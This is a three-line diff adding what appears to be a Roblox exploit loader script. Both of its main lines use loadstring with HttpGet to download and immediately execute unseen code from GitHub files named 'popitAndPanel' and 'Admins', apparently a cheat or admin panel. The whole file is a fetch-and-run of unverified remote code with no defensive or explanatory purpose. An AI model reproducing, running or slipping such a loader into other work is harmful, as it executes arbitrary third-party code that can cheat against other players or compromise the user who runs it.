@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Farx11122/U0/main/popitAndPanel"))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Farx11122/U0/main/Admins"))()
